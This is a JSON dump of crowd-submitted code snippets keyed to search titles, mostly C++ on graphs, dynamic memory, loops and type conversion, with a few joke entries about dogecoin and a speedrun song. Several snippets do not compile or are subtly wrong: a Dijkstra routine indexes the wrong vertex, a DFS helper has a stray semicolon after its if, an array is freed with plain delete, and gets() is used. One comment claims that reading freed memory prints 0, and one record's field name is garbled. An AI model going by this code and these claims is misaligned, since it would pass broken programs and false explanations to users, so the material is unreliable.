    "description": "#include<iostream> using namespaace; int main() { cout<<\"Tadu a programer!!!\"<<endl; return0; }\n#include <iostream> using namespace std;  struct adjNode {     int val, cost;     adjNode* next; };  struct graphEdge {     int start_ver, end_ver, weight; }; class DiaGraph{         adjNode* getAdjListNode(int value, int weight, adjNode* head)   {         adjNode* newNode = new adjNode;         newNode->val = value;         newNode->cost = weight;                   newNode->next = head;          return newNode;     }     int N;   public:     adjNode **head;                DiaGraph(graphEdge edges[], int n, int N)  {               head = new adjNode*[N]();         this->N = N;                 for (int i = 0; i < N; ++i)             head[i] = nullptr;                for (unsigned i = 0; i < n; i++)  {             int start_ver = edges[i].start_ver;             int end_ver = edges[i].end_ver;             int weight = edges[i].weight;                     adjNode* newNode = getAdjListNode(end_ver, weight, head[start_ver]);                                              head[start_ver] = newNode;              }     }          ~DiaGraph() {     for (int i = 0; i < N; i++)         delete[] head[i];         delete[] head;      } };  void display_AdjList(adjNode* ptr, int i) {     while (ptr != nullptr) {         cout << \"(\" << i << \", \" << ptr->val             << \", \" << ptr->cost << \") \";         ptr = ptr->next;     }     cout << endl; }  int main() {          graphEdge edges[] = {                {0,1,2},{0,2,4},{1,4,3},{2,3,2},{3,1,4},{4,3,3}     };     int N = 6;           int n = sizeof(edges)/sizeof(edges[0]);         DiaGraph diagraph(edges, n, N);        cout<<\"Graph adjacency list \"<<endl<<\"(start_vertex, end_vertex, weight):\"<<endl;     for (int i = 0; i < N; i++)     {                  display_AdjList(diagraph.head[i], i);     }     return 0; }\n//code  by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/  #include <bits/stdc++.h> using namespace std;  //undirected weighted graph and all functions class WeightedGraph {   vector< pair<int,int> >*adjacency_list;   int vertices;   public:   WeightedGraph(int n)   {     vertices=n;     adjacency_list=new vector< pair<int,int> >[n];   }   void add_edge(int v1,int v2,int wt);   void dfsHelper(int src,bool visited[]);   void dfs(int src);   void bfs(int src);   int minDistance(vector<int>dist,bool visited[]);     void djisktra(int src);   void display_graph(); };  int main() {   //graph of five vertices   WeightedGraph wg1(5);   //adding edges   wg1.add_edge(0,1,10);   wg1.add_edge(1,2,20);   wg1.add_edge(2,3,30);   wg1.add_edge(1,3,40);   wg1.add_edge(2,4,100);   wg1.add_edge(4,0,10);   //displaying the graph   wg1.display_graph();   //dfs from vertex 0   wg1.dfs(0);   //bfs from vertex 0   wg1.bfs(0);   //djikstra   for(int i=0;i<5;i++)   {     djikstra(i);   }   return 0; } //function definitions  void WeightedGraph::add_edge(int v1,int v2,int wt) {   /*push the other vertex into the adjacency list of the given vertex   and vice versa. If it would have been a directed graph,   only the first line would be enough   */   adjacency_list[v1].push_back(make_pair(v2,wt));   adjacency_list[v2].push_back(make_pair(v1,wt)); }  void WeightedGraph::dfsHelper(int src,bool visited[]) {   visited[src]=true;   cout<<src<<\" \";   for(vector<int>::iterator it=adjacency_list.begin();i!=adjacency_list.end();it++)   {     if(!visited[it->first]);       dfsHelper(it->first,visited);   } } void WeightedGraph::dfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   dfsHelper(src,visited); } void WeightedGraph::bfs(int src) {   bool visited[vertices];   for(int i=0;i<vertices;i++)     visited[i]=false;   cout<<src<<\" \";   visited[src]=true;   queue<int>helper;   helper.push(src);   while(!helper.empty())   {     src=helper.front();     for(vector<int>::iterator it=adjacency_list[src].begin();it!+adjacency_list[src].end();it++)     {       if(!visited[it->first])       {         visited[it->first]=true;         cout<<it->first<<\" \";         helper.push(it->first);       }     }     helper.pop();   } }  int WeightedGraph::minDistance(vector<int>dist,bool visited[])   {     int min=INT_MAX;     int minIndex=INT_MAX;     for(int i=0;i<N;i++)     {       if(!visited[i]&&dist[i]<=min)       {         min=dist[i];         minIndex=i;       }     }     return minIndex;   }   void WeightedGraph::djikstra(int src)   {     vector<int>dist;     bool visited[vertices];     for(int i=0;i<vertices;i++)     {       dist.push_back(INT_MAX);       visited[i]=false;     }     visited[src]=true;     dist[src]=0;     for(int i=0;i<vertices-1;i++)     {       int k=minDistance(dist,visited);       visited[k]=true;       for(int j=0;j<vertices;j++)       {         if(!visited[i]&&dist[i]!=INT_MAX&&adjacency_list[i][j].second+dist[i]<dist[j])         {           dist[j]=adjacency_list[i][j].second+dist[i];         }       }     }     for(int i=0;i<dist.size();i++)       cout<<dist[i]<<\" \";          cout<<endl;   } void WeightedGraph::display_graph() {   int a,b;   //first loop to traverse across vertices   for(int i=0;i<vertices;i++)   {       cout<<\"Adjacency list of vertex \"<<i<<endl;     //second loop to traverse across the adjacency list of some vertex i     for(auto it=adjacency_list[i].begin();it!=adjacency_list[i].end();it++)     {       //set a as the vertex number and b as the weight       a=it->first;       b=it->second;       cout<<\"Vertex : \"<<a<<\" Weight : \"<<b<<endl;     }     cout<<endl;   } }  //thank you! \n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1862,
    "keyword": null,
    "link": null,
    "title": " disallowcopy c++",
    "description": "Method 1: Private copy constructor and copy assignment operator   class Car { public:   Car(): owner() {}   void setOwner(Person *o) { owner = o; }   Person *getOwner() const { return owner; }   void info() const; private:   Car(const Car&);   Car& operator=(const Car&);   Person *owner; };  Method 2: Deleted copy constructor and copy assignment operator   class Car { public:   Car(const Car&) = delete;   void operator=(const Car&) = delete;   Car(): owner() {}   void setOwner(Person *o) { owner = o; }   Person *getOwner() const { return owner; } private:   Person *owner; };\n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1863,
    "keyword": null,
    "link": null,
    "title": " distance from point to line",
    "description": "// Get the normal distance from a point P to a line  // defined by two points L1 and L2: // // Formula:  float normalDistanceToLine(vec2 P, vec2 L1, vec2 L2) {     float dividend = abs((L2.x - L1.x)*(L1.y - P.y) - (L1.x - P.x)*(L2.y - L1.y));     float divisor = sqrt(pow(L2.x - L1.x, 2) + pow(L2.y - L1.y, 2));        if (divisor != 0.f) {         return dividend / divisor;     else\t\t// Points L1 and L2 are the same, choose one       \treturn sqrt(pow(P.x - L1.x, 2) + pow(P.y - L1.y, 2)); }    // With a distance function (maybe for a glsl shader)    float normalDistanceToLine(vec2 P, vec2 L1, vec2 L2) {        float dist = distance(L1, L2);        if (dist != 0.f) {         return abs((L2.x - L1.x)*(L1.y - P.y) - (L1.x - P.x)*(L2.y - L1.y)) / dist;     else\t\t// Points L1 and L2 are the same, choose one       \treturn distance(P, L1); } \n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1864,
    "keyword": null,
    "link": null,
    "title": " distinct char string c++",
    "description": "#include<stdio.h> #include<string.h>  // function to return the number of unique // characters in str[] int count_unique_char(char* str) {  \tint hash[128] = { 0 }; \tint i, c = 0;  \t// reading each character of str[] \tfor (i = 0; i < strlen(str); ++i) { \t\t// set the position corresponding  \t\t// to the ASCII value of str[i] in hash[] to 1 \t\thash[str[i]] = 1; \t}  \t// counting number of unique characters \t// repeated elements are only counted once \tfor (i = 0; i < 128; ++i) { \t\tc += hash[i]; \t}  \treturn c;  }  int main() {  \tchar str[300];  \tprintf(\"Enter String: \"); \tgets(str);  \tprintf(\"Number of Unique Characters in String: %d\", count_unique_char(str));  } \n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1865,
    "keyword": null,
    "link": null,
    "title": " div content editable",
    "description": "<div contenteditable=\"true\">   This text can be edited by the user. </div>\n",
    "reg_date": "2021-10-12T11:39:51.000Z"
  },
  {
    "id": 1866,
    "keyword": null,
    "link": null,
    "title": " divide two polynomials c++",
    "description": " #include <iostream>#include <iterator>#include <vector> using namespace std;typedef vector<double> Poly; // does:  prints all members of vector// input: c - ASCII char with the name of the vector//        A - reference to polynomial (vector)void Print(char name, const Poly &A) {\tcout << name << \"(\" << A.size()-1 << \") = [ \";\tcopy(A.begin(), A.end(), ostream_iterator<decltype(A[0])>(cout, \" \"));\tcout << \"]\\n\";} int main() {\tPoly N, D, d, q, r;        // vectors - N / D == q && N % D == r\tsize_t dN, dD, dd, dq, dr; // degrees of vectors\tsize_t i;                  // loop counter \t// setting the degrees of vectors\tcout << \"Enter the degree of N: \";\tcin >> dN;\tcout << \"Enter the degree of D: \"; \tcin >> dD;\tdq = dN-dD;  \tdr = dN-dD; \tif( dD < 1 || dN < 1 ) {\t\tcerr << \"Error: degree of D and N must be positive.\\n\";\t\treturn 1;\t} \t// allocation and initialization of vectors\tN.resize(dN+1);\tcout << \"Enter the coefficients of N:\"<<endl;  \tfor ( i = 0; i <= dN; i++ ) {\t\tcout << \"N[\" << i << \"]= \";\t\tcin >> N[i];\t} \tD.resize(dN+1);\tcout << \"Enter the coefficients of D:\"<<endl;\t\tfor ( i = 0; i <= dD; i++ ) {\t\tcout << \"D[\" << i << \"]= \";\t\tcin >> D[i];\t} \td.resize(dN+1);\tq.resize(dq+1);\tr.resize(dr+1); \tcout << \"-- Procedure --\" << endl << endl;\tif( dN >= dD ) {\t\twhile(dN >= dD) {\t\t\t// d equals D shifted right\t\t\td.assign(d.size(), 0); \t\t\tfor( i = 0 ; i <= dD ; i++ )\t\t\t\td[i+dN-dD] = D[i];\t\t\tdd = dN; \t\t\tPrint( 'd', d ); \t\t\t// calculating one element of q\t\t\tq[dN-dD] = N[dN]/d[dd]; \t\t\tPrint( 'q', q ); \t\t\t// d equals d * q[dN-dD]\t\t\tfor( i = 0 ; i < dq + 1 ; i++ )\t\t\t\td[i] = d[i] * q[dN-dD]; \t\t\tPrint( 'd', d ); \t\t\t// N equals N - d\t\t\tfor( i = 0 ; i < dN + 1 ; i++ )\t\t\t\tN[i] = N[i] - d[i];\t\t\tdN--; \t\t\tPrint( 'N', N );\t\t\tcout << \"-----------------------\" << endl << endl; \t\t}\t} \t// r equals N \tfor( i = 0 ; i <= dN ; i++ )\t\tr[i] = N[i]; \tcout << \"=========================\" << endl << endl;\tcout << \"-- Result --\" << endl << endl; \tPrint( 'q', q );\tPrint( 'r', r );}  \n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1867,
    "keyword": null,
    "link": null,
    "title": " dlopen failed: library \"libomp.so\" not found",
    "description": "#I have changed flags in CMakeLists.txt as following: set(CMAKE_C_FLAGS \"${CMAKE_C_FLAGS} -fopenmp -static-openmp\") set(CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} -fopenmp -static-openmp\")\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1868,
    "keyword": null,
    "link": null,
    "title": " do c++ ints neeed to be initlaized",
    "description": "tldr; Yes, or you risk getting a random number as the starting value.  For automatic variables: Some compilers might do it but the standard does not require it. A conforming implementation could leave them to be uninitialized garbage values.  For static variables: They must be initialized to zero unless explicitly initialized otherwise.\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1869,
    "keyword": null,
    "link": null,
    "title": " do while c++",
    "description": "do {    // codes; } while (testExpression);\nwhile (test_expression) {    // statements     update_expression; }\nwhile (x != 0){ ... }\ndo {    statement(s); } while(condition);\n//Executes a statement repeatedly, until the value of condition becomes false. //The test takes place before each iteration while(condition) {   statement }\n#include <iostream> #include <string> using namespace std;   int main()  {    cout<<\"Printing 2's multiples less than 20\"<<endl;    int i=2;    do    {    cout<<\"i = \"<<i<<\"\\t\";      i += 2;    }while(i<=20);  } \n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1870,
    "keyword": null,
    "link": null,
    "title": " do while loop c++ loops continuously",
    "description": "//vars int A; //any variable will do  // loop do {   A = 0; // clearing last input from last looping   cout << \"request value for A\";   cin >> A;    } while (A != 'any value other than zero');\ndo {    // codes; } while (testExpression);\nwhile(/*Expression*/){  //Statements go here }\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1871,
    "keyword": null,
    "link": null,
    "title": " dogecoin price",
    "descriptionnvery true  TO THE MOON\nWe shall go to da moon \nGoing to Mars\nwhile True:     print('dogecoin going to the moon')     \nTO THE MOON loading ----> TO BE --$392$--\nwoooooow so mUCH MONEYYYYY\nMUCH WOW\nDOGECOIN TO A DOLLAR (but then we all sell)\ncome guys all I want to find out is dogecoins price????\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1872,
    "keyword": null,
    "link": null,
    "title": " double code in c++",
    "description": "double pi;\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1873,
    "keyword": null,
    "link": null,
    "title": " double max value c++",
    "description": "short: min: -32768 max: 32767 int: min: -2147483648 max: 2147483647 long: min: -2147483648 max: 2147483647 float: min: 1.17549e-038 max: 3.40282e+038 double: min: 2.22507e-308 max: 1.79769e+308 long double: min: 2.22507e-308 max: 1.79769e+308 unsigned short: min: 0 max: 65535 unsigned int: min: 0 max: 4294967295 unsigned long: ...\nstd::numeric_limits<double>::max()\n",
    "reg_date": "2021-10-12T11:39:52.000Z"
  },
  {
    "id": 1874,
    "keyword": null,
    "link": null,
    "title": " double pointers C++",
    "description": "#include <stdio.h>  int main(void) {     int value = 100;     int *value_ptr = &value;     int **value_double_ptr = &value_ptr;      printf(\"Value: %d\\n\", value);     printf(\"Pointer to value: %d\\n\", *value_ptr);     printf(\"Double pointer to value: %d\\n\", **value_double_ptr); } \n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1875,
    "keyword": null,
    "link": null,
    "title": " double to float c++",
    "description": "    double v1 = 20120313.0;     float v2 = (float) v1;\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1876,
    "keyword": null,
    "link": null,
    "title": " double to int c++",
    "description": "double x = 5.4; int y = (int) x;\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1877,
    "keyword": null,
    "link": null,
    "title": " double to string c++",
    "description": "// to_string example #include <iostream>   // std::cout #include <string>     // std::string, std::to_string  int main () {   std::string pi = \"pi is \" + std::to_string(3.1415926);   std::string perfect = std::to_string(1+2+4+7+14) + \" is a perfect number\";   std::cout << pi << '\\n';   std::cout << perfect << '\\n';   return 0; }\nstd::ostringstream strs; strs << dbl; std::string str = strs.str();\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1878,
    "keyword": null,
    "link": null,
    "title": " doxygen cmake",
    "description": "# first we can indicate the documentation build as an option and set it to ON by default option(BUILD_DOC \"Build documentation\" ON)  # check if Doxygen is installed find_package(Doxygen) if (DOXYGEN_FOUND)     # set input and output files     set(DOXYGEN_IN ${CMAKE_CURRENT_SOURCE_DIR}/../docs/Doxyfile.in)     set(DOXYGEN_OUT ${CMAKE_CURRENT_BINARY_DIR}/Doxyfile)      # request to configure the file     configure_file(${DOXYGEN_IN} ${DOXYGEN_OUT} @ONLY)     message(\"Doxygen build started\")      # note the option ALL which allows to build the docs together with the application     add_custom_target( doc_doxygen ALL         COMMAND ${DOXYGEN_EXECUTABLE} ${DOXYGEN_OUT}         WORKING_DIRECTORY ${CMAKE_CURRENT_BINARY_DIR}         COMMENT \"Generating API documentation with Doxygen\"         VERBATIM ) else (DOXYGEN_FOUND)   message(\"Doxygen need to be installed to generate the doxygen documentation\") endif (DOXYGEN_FOUND)\nif (CMAKE_BUILD_TYPE MATCHES \"^[Rr]elease\")     # build the docs endif()\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1879,
    "keyword": null,
    "link": null,
    "title": " draw a rectangle and rotate it to a specific angle c++ pdf",
    "description": "#include <iostream> #include <cmath> #include <iomanip>  struct Point{     double x = 0;     double y = 0;          Point(double aX = 0, double aY = 0){         x = aX;         y = aY;     }          void translate( double aX, double aY ){         x += aX;         y += aY;     }     // ANTI-CLOCKWISE ROTATION OF Point ABOUT ORIGIN     void rotate( double aAngle ){         double xTemp = x;         double yTemp = y;                  double theta = aAngle * M_PI / 180;         double c = cos( theta );         double s = sin( theta );                  x = xTemp * c - yTemp * s;         y = xTemp * s + yTemp * c;     } };  std::ostream & operator<<(std::ostream & out, const Point & aPoint){     out << std::fixed << std::setprecision(2) << \"(\" << aPoint.x << \", \" << aPoint.y << \")\";     return out; }  int main(){          Point triangle[] = {Point(2,1), Point(3,3), Point(4,2)};     Point geometric_center(0,0);          for(auto i:triangle){         geometric_center.x += i.x/3;         geometric_center.y += i.y/3;     }     std::cout << \"Geometric center: \" << geometric_center << '\\n';          for(auto i:triangle){         std::cout << i << \" -> \";         i.translate(-geometric_center.x, -geometric_center.y);         i.rotate(90);         i.translate(geometric_center.x, geometric_center.y);                  std::cout << i << '\\n';     }     return 0; }\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1880,
    "keyword": null,
    "link": null,
    "title": " draw rectangle opencv c++",
    "description": "// just some valid rectangle arguments int x = 0; int y = 0; int width = 10; int height = 20; // our rectangle... cv::Rect rect(x, y, width, height); // and its top left corner... cv::Point pt1(x, y); // and its bottom right corner. cv::Point pt2(x + width, y + height); // These two calls... cv::rectangle(img, pt1, pt2, cv::Scalar(0, 255, 0)); // essentially do the same thing cv::rectangle(img, rect, cv::Scalar(0, 255, 0)) \ncv2.circle(img, center, radius, color[, thickness[, lineType[, shift]]])\nhstr1782@gmail.\n",
    "reg_date": "2021-10-12T11:39:53.000Z"
  },
  {
    "id": 1881,
    "keyword": null,
    "link": null,
    "title": " dream speedrun music free download mp3",
    "description": "just fucking why\n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1882,
    "keyword": null,
    "link": null,
    "title": " dream speedrun song mp4",
    "description": "stfu - NixonXc 2021\n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1883,
    "keyword": null,
    "link": null,
    "title": " dristinct word in string c++",
    "description": "#include <iostream> #include <vector>  using namespace std;  int main() {     vector<string> words;     cout<<\"Please Enter words(Press Ctrl+Z in the end)\"<<endl;      string x; //Word Input     cin>>x;     words.push_back(x); //The first word     int ndw=1; //Number of distinct words      while(cin>>x) //Input new word     {         for(unsigned int counter = 0; counter!=words.size(); ++counter)         {             //Check if we already have this word in our list             if(x!=words[counter])             {                 if(counter==words.size()-1)//We have reached the end of list                 {                     words.push_back(x);                     ndw+=1;                 }             }             else             {                 //If there is a match, leave this word                 break;             }         }     }     cout<<\"number of distinct words are: \"<<ndw;     return 0; } \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1884,
    "keyword": null,
    "link": null,
    "title": " ds1307 rtc set time",
    "description": "#include <Time.h> #include <DS1307RTC.h> #include <Wire.h> ... setTime(hr,min,sec,day,month,yr); RTC.set(now()); \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1885,
    "keyword": null,
    "link": null,
    "title": " dutch national flag algorithm",
    "description": "Initially all array values are treated as unpartitioned: [unpartitioned values] Array split into four parts as the iteration proceeds: [ values < mid | values = mid | unpartitioned values | values > mid ]  procedure three-way-partition(A : array of values, mid : value):     i &larr; 0     j &larr; 0     k &larr; size of A - 1      while j <= k:         if A[j] < mid:             swap A[i] and A[j]             i &larr; i + 1             j &larr; j + 1         else if A[j] > mid:             swap A[j] and A[k]             k &larr; k - 1         else:                       j &larr; j + 1  \nApproach: Count the number of 0s, 1s and 2s in the given array.  Then store all the 0s in the beginning followed by all the 1s then all the 2s. Algorithm: 1)Keep three counter c0 to count 0s, c1 to count 1s and c2 to count 2s 2)Traverse through the array and increase the count of c0 is the    element is 0,increase the count of c1 if the element is 1 and    increase the count of c2 if the element is 2 3)Now again traverse the array and replace first c0 elements with 0,    next c1 elements with 1 and next c2 elements with 2.  //GfG PseudoCode\n#include <bits/stdc++.h>  using namespace std;   void dutch(int arr[],int n) {   int low=0;   int mid=0;   int high=n-1;   while(mid<=high)   {      switch(arr[mid])      {      case 0:         {             swap(arr[low++],arr[mid++]);             break;         }      case 1:          {              mid++;              break;          }      case 2:         {             swap(arr[high--],arr[mid]);             break;         }      }   } } int main() {     int n;     cout<<\"Enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"Enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     dutch(arr,n);     cout<<\"our sorted array is:\"<<endl;     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1886,
    "keyword": null,
    "link": null,
    "title": " dynamic array cpp",
    "description": "int main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; }\nint* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \nint length = 69; int * numbers = new int[length]; delete[] numbers;\n#include <iostream> #include <cstddef> // std::size_t   int main() {     std::cout << \"Enter a positive integer: \";     std::size_t length{};     std::cin >> length;       int *array{ new int[length]{} }; // use array new.  Note that length does not need to be constant!       std::cout << \"I just allocated an array of integers of length \" << length << '\\n';       array[0] = 5; // set element 0 to value 5       delete[] array; // use array delete to deallocate array       // we don't need to set array to nullptr/0 here because it's going to go out of scope immediately after this anyway       return 0; }\nint main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; } \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1887,
    "keyword": null,
    "link": null,
    "title": " dynamic constructor in c++",
    "description": "//dynamic constructor and application //code by Soumyadeep Ghosh //insta : @soumyadepp //linked in: https://www.linkedin.com/in/soumyadeep-ghosh-90a1951b6/  #include <bits/stdc++.h>  using namespace std;  class Array {   int *a;   int size;   public:     Array(int n)     {       a=new int[n]; //dynamic constructor allocating memory for n integers       size=n;     }   void getarr()   {     for(int i=0;i<size;i++)     {       cin>>a[i];     }   }   void putarr()   {     for(int i = 0; i < size ; i++ )     {       cout<<a[i]<<\" \"<<;     }     cout<<endl;   } };   int main() {   Array a(10);   //array of 10 integers   a.getarr();  //to accept 10 integers   a.putarr();  //to display 10 integers   return 0; }  //thank you!\n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1888,
    "keyword": null,
    "link": null,
    "title": " dynamic memory allocation",
    "description": "int *array = malloc(10 * sizeof(int));\n// Use malloc to allocate memory ptr = (castType*) malloc(size); int *exampl = (int*) malloc(sizeof(int)); // Use calloc to allocate and inizialize n contiguous blocks of memory ptr = (castType*) calloc(n, size); char *exampl = (char*) calloc(20, sizeof(char));\n#include <stdlib.h>  void *malloc(size_t size);  void exemple(void) {   char *string;      string = malloc(sizeof(char) * 5);   if (string == NULL)     return;   string[0] = 'H';   string[1] = 'e';   string[2] = 'y';   string[3] = '!';   string[4] = '\\0';   printf(\"%s\\n\", string);   free(string); }  /// output : \"Hey!\"\n // declare a pointer variable to point to allocated heap space int    *p_array; double *d_array;  // call malloc to allocate that appropriate number of bytes for the array  p_array = (int *)malloc(sizeof(int)*50);      // allocate 50 ints d_array = (int *)malloc(sizeof(double)*100);  // allocate 100 doubles   // use [] notation to access array buckets  // (THIS IS THE PREFERED WAY TO DO IT) for(i=0; i < 50; i++) {   p_array[i] = 0; }  // you can use pointer arithmetic (but in general don't) double *dptr = d_array;    // the value of d_array is equivalent to &(d_array[0]) for(i=0; i < 50; i++) {   *dptr = 0;   dptr++; } \nint *p = new int; // request memory *p = 5; // store value  cout << *p << endl; // Output is 5  delete p; // free up the memory  cout << *p << endl; // Output is 0\nint* a =(int*)malloc(sizeof(int))\n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1889,
    "keyword": null,
    "link": null,
    "title": " dynamic memory allocation in c++",
    "description": "int * foo; foo = new int [5];\nint length = 69; int * numbers = new int[length]; delete[] numbers;\nint *p = new int; // request memory *p = 5; // store value  cout << *p << endl; // Output is 5  delete p; // free up the memory  cout << *p << endl; // Output is 0\n#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New\n#include <iostream> using namespace std;  int main () {    double* pvalue  = NULL; // Pointer initialized with null    pvalue  = new double;   // Request memory for the variable      *pvalue = 29494.99;     // Store value at allocated address    cout << \"Value of pvalue : \" << *pvalue << endl;     delete pvalue;         // free up the memory.     return 0; }\nchar* pvalue  = NULL;         // Pointer initialized with null pvalue  = new char[20];       // Request memory for the variable \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1890,
    "keyword": null,
    "link": null,
    "title": " dynamic memory management c++",
    "description": "char* pvalue  = NULL;         // Pointer initialized with null pvalue  = new char[20];       // Request memory for the variable \n// declare an int pointer int* pointVar;  // dynamically allocate memory // using the new keyword  pointVar = new int;  // assign value to allocated memory *pointVar = 45; \n",
    "reg_date": "2021-10-12T11:39:54.000Z"
  },
  {
    "id": 1891,
    "keyword": null,
    "link": null,
    "title": " dynamic programming with code implementation in c++",
    "description": "int fibonacci(int n) {     if(n == 0)     {         return 0;     }     if(n == 1)     {         return 1;     }     else     {         return fibonacci(n - 1) + fibonacci(n - 2);     } }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1892,
    "keyword": null,
    "link": null,
    "title": " easy c++ code",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1893,
    "keyword": null,
    "link": null,
    "title": " easy way to encrypt a c++ file line by line",
    "description": "for(size_t i = 0; i < line.size(); ++i) {   line[i] += 4; }\nImGui::Text(\"Made By Joker\");\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1894,
    "keyword": null,
    "link": null,
    "title": " egg drop problem leetcode",
    "description": "#include<iostream>  inline int f(int exp, int balls);  int f(int exp, int balls) {        if(exp == 0 || balls == 0)         return 0 ;      return f(exp-1, balls)+ f(exp-1,balls-1)+1 ;  } int main() {     int experince{0};     int balls {0};     int floors {0};     std::cout<<\"Please enter the number of floors: \";     std::cin>>floors;     std::cout <<\"\\nPlease enter the number of balls: \";     std::cin>>balls;      while(true)     {         ++experince;         if(f(experince,balls) >= floors)             break;     }      std::cout<<\"\\nNumber experince required \"<<experince<<std::endl;     return 0 ; }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1895,
    "keyword": null,
    "link": null,
    "title": " egg floor code",
    "description": "#include<iostream>  inline int f(int exp, int balls);  int f(int exp, int balls) {        if(exp == 0 || balls == 0)         return 0 ;      return f(exp-1, balls)+ f(exp-1,balls-1)+1 ;  } int main() {     int experince{0};     int balls {0};     int floors {0};     std::cout<<\"Please enter the number of floors: \";     std::cin>>floors;     std::cout <<\"\\nPlease enter the number of balls: \";     std::cin>>balls;      while(true)     {         ++experince;         if(f(experince,balls) >= floors)             break;     }      std::cout<<\"\\nNumber experince required \"<<experince<<std::endl;     return 0 ; }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1896,
    "keyword": null,
    "link": null,
    "title": " eigenvalue of matrix c++ using Eigen",
    "description": "  #include <eigen3/Eigen/Eigenvalues> // header file   #include <iostream>    int main(){   Eigen::Matrix<double, 2, 2> A; // declare a real (double) 2x2 matrix   A << 0, 2, 1, 0; // defined the matrix A    Eigen::EigenSolver<Eigen::Matrix<double, 2,2> > s(A); // the instance s(A) includes the eigensystem   std::cout << A << std::endl;   std::cout << \"eigenvalues:\" << std::endl;   std::cout << s.eigenvalues()(0) << std::endl;   std::cout << \"eigenvectors=\" << std::endl;   std::cout << s.eigenvectors() << std::endl;    return(0); }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1897,
    "keyword": null,
    "link": null,
    "title": " ejemplo",
    "description": "   Grafo grafo(V);    int aristas = 0;    for (int v = 0; v < V; ++v)       for (int w : grafo.ady(v))          if (v < w) ++aristas;    cout << aristas << '\\n'; \n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1898,
    "keyword": null,
    "link": null,
    "title": " elements of set c++",
    "description": "//Method 1:  set<int>:: iterator it;  for( it = s.begin(); it != s.end(); ++it){     int ans = *it;     cout << ans << endl;  } //Method 2:  for( auto& it : s) {      cout << it << \" \";  }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1899,
    "keyword": null,
    "link": null,
    "title": " elixir update map",
    "description": "iex> Map.merge(%{a: 1, b: 2}, %{a: 3, d: 4}) %{a: 3, b: 2, d: 4}\nmap = %{previous_map | priority: 1 }\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1900,
    "keyword": null,
    "link": null,
    "title": " ellipsis",
    "description": "div {   white-space: nowrap;   overflow: hidden;   text-overflow: ellipsis; }\n... hate you guys\nellipsis(...) indicate the number of aruguments of a particular type ellipsis must be placed at the end of parmeter list\n",
    "reg_date": "2021-10-12T11:39:55.000Z"
  },
  {
    "id": 1901,
